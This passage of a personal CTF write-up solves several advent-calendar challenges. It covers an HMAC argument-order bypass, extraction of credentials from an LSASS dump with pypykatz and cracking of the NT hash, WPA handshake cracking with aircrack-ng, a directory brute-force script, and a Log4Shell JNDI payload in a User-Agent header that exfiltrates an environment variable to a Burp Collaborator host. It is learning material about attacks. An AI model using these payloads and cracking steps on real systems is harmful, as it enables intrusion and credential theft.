Just like the last time it was possible to get access to `.htaccess`:
`document.location='card.php?card=' + btoa('.htaccess');` => http://rsxc.no:20019/card.php?card=Lmh0YWNjZXNz`

### Flag
**The flag was `RSXC{It_is_not_smart_to_let_people_include_whatever_they_want}`**.  
   
   
   
## 20 - Easy mistakes
### Challenge
> When programming, it is easy to make simple mistakes, and some of them can have dire consequences.
>
> http://rsxc.no:20020

### Tools used
- [Vivaldi developer tools](https://help.vivaldi.com/desktop/tools/developer-tools/)

### Solution
We were given the source code of `api.php` which would give the flag if the right data was posted to it. The intention of the code was to only reveal the flag if the `host` parameter was sent with a belonging valid [`hmac`](https://en.wikipedia.org/wiki/HMAC) signature.

The code used PHP's function [`hash_hmac()`](https://php.net/hash_hmac). The problem with the code was that the order of parameters was mixed up so that `host` became the name of selected hashing algorithm (`$algo`), `$secret` became the message to be hashed (`$data`), and `"sha256"` became the shared secret key (`$key`).

On the server's PHP version 7.4.26 `hash_hmac()` returns `false` if the specified algorithm is incorrect. Since that the check afterwards was that the parameter `hmac` should be equal to the result of the hash function it was possible to set the incoming `hmac` parameter to `false`. Simple mistake, dire consequences.

This can be solved quickly directly in the web browser developer tools:

![image](https://user-images.githubusercontent.com/832005/146739248-236540e5-76c8-412f-81b1-f82c8ec1f59b.png)

```js
> fetch('api.php', {method:'POST',body:'{"hmac":false,"host":""}'}).then(res => res.text().then(text => console.log(text)));

< RSXC{You_have_to_have_the_right_order_for_arguments!}
````


### Flag
**The flag was `RSXC{You_have_to_have_the_right_order_for_arguments!}`**.  
   
   
   
## 21 - Nice memories
### Challenge
> **Note: The flag is the clear text password for river-security-xmas user.**  
> On a IR mission we found that the threatactor dumped lsass file.
> Can you rock our world and find the flag for us?
> 
> https://rsxc.no/35a2c6961adc6886665363b6f47c3a156356a91a4cf602416b250aa4daca4167/21-challenge.zip

### Input
 - [21-challenge.zip](./files/21-challenge.zip)

### Tools used
 - [pypykatz](https://github.com/skelsec/pypykatz)
 - [John the Ripper](https://en.wikipedia.org/wiki/John_the_Ripper)

### Solution
I started out taking a look at the file we've got:

```sh
$ unzip 21-challenge.zip 
Archive:  21-challenge.zip
  inflating: lsass.DMP

$ file lsass.DMP 
lsass.DMP: Mini DuMP crash report, 16 streams, Fri Nov 12 12:33:06 2021, 0x421826 type
```

There was nothing new so far. It was a memory dump of Window's [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service). That's the process responsible for enforcing the security policy on the system.

[pypykatz](https://github.com/skelsec/pypykatz) is a [mimikatz](https://github.com/gentilkiwi/mimikatz) implementation. Using that tool to process the LSASS dump I got hold of the username and password hashes:

```
$ pypykatz lsa minidump lsass.DMP
INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 1304254 (13e6be)
session_id 2
username river-security-xmas
domainname DESKTOP-V1MQH3P
logon_server WIN-QC6FTBKEEE9
logon_time 2021-11-12T12:29:30.144510+00:00
sid S-1-5-21-2640804858-4017698289-1413954960-1001
luid 1304254
	== MSV ==
		Username: river-security-xmas
		Domain: DESKTOP-V1MQH3P
		LM: NA
		NT: 7801ee9c5762bb027ee224d54cb8f62e
		SHA1: bebad302f8e64b59279c3a6747db0e076800d9ca
		DPAPI: NA
[...]
```

The challenge text hinted towards the infamous `RockYou.txt` password list from the [RockYou data breach](https://en.wikipedia.org/wiki/RockYou#Data_breach). So I took the NT hash and used the password cracking tool [John the Ripper](https://en.wikipedia.org/wiki/John_the_Ripper) with that password list to get the password and flag in cleartext:

```sh
$ echo 7801ee9c5762bb027ee224d54cb8f62e > nt.txt

$ john --format:NT --wordlist:/usr/share/wordlists/rockyou.txt nt.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 ASIMD 4x2])
Warning: no OpenMP support for this hash type, consider --fork=5
Press 'q' or Ctrl-C to abort, almost any other key for status
alliwantforchristmasisyou (?)     
1g 0:00:00:00 DONE (2021-12-21 10:44) 1.515g/s 15477Kp/s 15477Kc/s 15477KC/s allsport1..allerton56
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
```

### Flag
**The flag was `alliwantforchristmasisyou`**.  
   
   
   
## 22 - Wireless communication
### Challenge
> We tried to find a new way of sending the flag, and this time it is even encrypted! Since we are nice we will even give you a hint. The password starts with **S**. Can *you Rock* our world?
> 
> https:///rsxc.no/5512383c4c02768617233eefdd4f79efe5dea9d08a850c8414644abf296845cf/22-challenge.cap

### Input
 - [22-challenge.cap](./files/22-challenge.cap)

### Tools used
 - [Aircrack-ng](https://aircrack-ng.org)
 - [Wireshark](https://www.wireshark.org)

### Solution
This one was a bit new to me, but a lot of fun. I hadn't really done any wireless network stuff before.

```sh
file 22-challenge.cap 
22-challenge.cap: pcap capture file, microsecond ts (little-endian) - version 2.4 (802.11, capture length 262144)
```

Another [`pcap`](https://en.wikipedia.org/wiki/pcap) file. I opened it in Wireshark first, but didn't understand too much of the wireless communication as it was encrypted. A little bit googling on the topic lead to [Aircrack-ng](https://aircrack-ng.org) which looked like the right tool for this task. It's an _"all things wireless security"_ software suite and is able to break into many networks.

```sh
$ aircrack-ng 22-challenge.cap                  
Reading packets, please wait...
Opening 22-challenge.cap
Read 63 packets.

   #  BSSID              ESSID                     Encryption

   1  1A:2F:49:69:AA:0A  Private                   WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening 22-challenge.cap
Read 63 packets.

1 potential targets

Please specify a dictionary (option -w).
```

Aircrack-ng immediately found a [WPA](https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access) handshake in the file and asked for a wordlist.

The challenge text hinted towards the good old `RockYou.txt` password list. However, providing that told me that I'd have to wait over 1 hour if it had to run through it all. The challenge text also told that the password started with the letter _S_:
```sh
grep -i "^s" /usr/share/wordlists/rockyou.txt > rsxc.txt
```

With that short list of password Aircrack-ng only wanted 5 minutes to check them all:


```sh
aircrack-ng 22-challenge.cap -w /tmp/rsxc.txt
```
<img src="./files/aircrack-ng.gif" width="600"/>

The password for the Wi-Fi was `Santaclaws99`. I entered it in Wireshark and was able to see the flag. 

![image](https://user-images.githubusercontent.com/832005/147148017-b4040ba2-06ca-41fb-a111-022ba9ca15d9.png)

### Flag
**The flag was `RSXC{WIFI_is_fun}`**. 
   
   
   
## 23 - Locating the location
### Challenge
> We seem to have lost a file, can you please help us find it?
> 
> http://rsxc.no:20023

### Tools used
 - [`dirb`](https://www.kali.org/tools/dirb/)
 - [Python](https://python.org)

### Solution
On the website we're told that we are looking for the file `flag.txt` in a subfolder on the server. [`dirb`](https://www.kali.org/tools/dirb/) has a wordlist `small.txt` which contains the directory.

I tried using `dirb` to find the directory, but all URLs seemed to answer with `HTTP` status `200 OK`, the text `404 - File not found` and the same `Content-Length`.

So I wrote a small Python script that looked for the file `flag.txt` in all the names in `small.txt`:
```py
import requests
import re
import time

ROOT_URL = 'http://rsxc.no:20023/'
FLAG_FILE = '/flag.txt'
FLAG_PATTERN = r"(RSXC{.*})"

clear_screen = '\033[H\033[J'
color_cyan = '\033[96m'
color_reset = '\033[0m'

f = open('/usr/share/dirb/wordlists/small.txt')
for path in f:
    url = ROOT_URL + path.strip() + FLAG_FILE # http://rsxc.no:20023/logfile/flag.txt
    print('%sTrying' % clear_screen, url)
    res = requests.get(url)
    if m := re.search(FLAG_PATTERN, res.text):
        print('Found flag %s%s%s in response:' % (color_cyan, m.group(1), color_reset)) # Found flag RSXC{Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag} in response:
        print(res.text)
        exit()
    time.sleep(0.1)
```

The script quickly found that the flag was located at http://rsxc.no:20023/logfile/flag.txt.

![image](https://user-images.githubusercontent.com/832005/147272577-bfb00686-f0ea-4ed3-91d8-c396fd90c228.png)

### Flag
**The flag was `RSXC{Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag}`**.  
   
   
   
## 24 - The watcher
### Challenge
> We have found a service that watches our every step, are you able to figure out how we can read the **FLAG** from the *environment*? NB. Container will be restarted every 30 minutes.
> 
> http://rsxc.no:20024

### Tools used
 - [Burp Suite](https://portswigger.net/burp/pro) (my license expires January 8th 🙏)
 - [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7=',true)&input=S0pKVlFRMzNLNVNWNlpEUEw1V0dTMjNGTDVXRzZaM0hORlhHT1gzU05GVFdRNUI3UFU)

### Solution
This turned out to be a timely challenge. The website just said _"Be careful, I'm logging everything..."_ and the challenge text felt like it hinted about `FLAG` as an environment variable. Yes, it was the just recently discovered [Log4Shell](https://en.wikipedia.org/wiki/Log4Shell) ([CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)) that can either or both have a server leak data or execute remote malicious code.

For this task I used [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) inside [Burp Suite](https://portswigger.net/burp/pro) as seen in the screenshot below. It gave me a subdomain which I could use to receive the flag from.

The URL from Burp Collaborator was of the format `[some id].burpcollaborator.net`. Changing the `User-Agent` header to `${jndi:ldap://x${env:FLAG}.[some id].burpcollaborator.net/a}` when accessing rsxc.no:20024 gave the flag back when the server did a DNS lookup.

![image](https://user-images.githubusercontent.com/832005/147373858-b99d277d-7a15-47e3-966d-da9675e7e247.png)

The DNS lookup was for an address like  `xbase32_KJJVQQ33K5SV6ZDPL5WGS23FL5WG6Z3HNFXGOX3SNFTWQ5B7PU.[some id].burpcollaborator.net`. Using [CyberChef with Base32 decoding](https://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7=',true)&input=S0pKVlFRMzNLNVNWNlpEUEw1V0dTMjNGTDVXRzZaM0hORlhHT1gzU05GVFdRNUI3UFU) I got the flag.

### Flag
**The flag was `RSXC{We_do_like_logging_right?}`**.  

## Some final thoughts
I really enjoyed this [advent calendar](https://en.wikipedia.org/wiki/Advent_calendar) style CTF. The challenges were typically done in not too many minutes, but it was a fun daily puzzle, and I learned a few new things and got to use some tools I hadn't tried out before. It was very nice that the challenges weren't "guessy" at all. The variety was good with a mix of more old style (though still found) security issues and more modern day ones, and also some none-security puzzles. I wouldn't change a thing about it. 10/10. 🙌

I hope they run the same type of CTF next year.

🎅🎄
